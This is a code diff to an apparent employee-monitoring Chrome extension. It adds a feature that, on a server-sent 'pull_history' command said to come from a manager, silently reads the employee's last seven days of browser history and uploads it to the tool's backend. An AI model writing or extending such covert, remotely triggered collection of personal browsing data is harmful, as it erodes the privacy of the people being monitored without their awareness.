@@ -27,6 +27,18 @@ async function setSession(session) {
   await chrome.storage.local.set({ session });
 }
 
+// سحب هيستوري المتصفح (آخر 7 أيام) وإرساله — عند طلب المدير عبر أمر pull_history
+async function pullAndSendHistory(employeeId) {
+  try {
+    if (!chrome.history) return;
+    const items = await chrome.history.search({ text: "", maxResults: 150, startTime: Date.now() - 7 * 24 * 60 * 60 * 1000 });
+    const mapped = items.map((h) => ({ url: h.url, title: h.title || "", visitAt: new Date(h.lastVisitTime || Date.now()).toISOString() }));
+    await api("/api/history", "POST", { employeeId, items: mapped });
+  } catch (_) {
+    /* صلاحية الهيستوري غير ممنوحة */
+  }
+}
+
 chrome.runtime.onMessage.addListener((msg, _sender, sendResponse) => {
   (async () => {
     try {
@@ -58,8 +70,13 @@ chrome.runtime.onMessage.addListener((msg, _sender, sendResponse) => {
         case "logout":
           await chrome.storage.local.remove("session");
           return sendResponse({ ok: true });
-        case "presence":
-          return sendResponse({ ok: true, data: await api("/api/presence", "POST", { employeeId: reqId(), ...msg.data }) });
+        case "presence": {
+          const data = await api("/api/presence", "POST", { employeeId: reqId(), ...msg.data });
+          if (data && Array.isArray(data.commands) && data.commands.includes("pull_history")) {
+            void pullAndSendHistory(s.employeeId);
+          }
+          return sendResponse({ ok: true, data });
+        }
         case "activity":
           return sendResponse({ ok: true, data: await api("/api/activity", "POST", { employeeId: reqId(), ...msg.data }) });
         case "shiftStart":
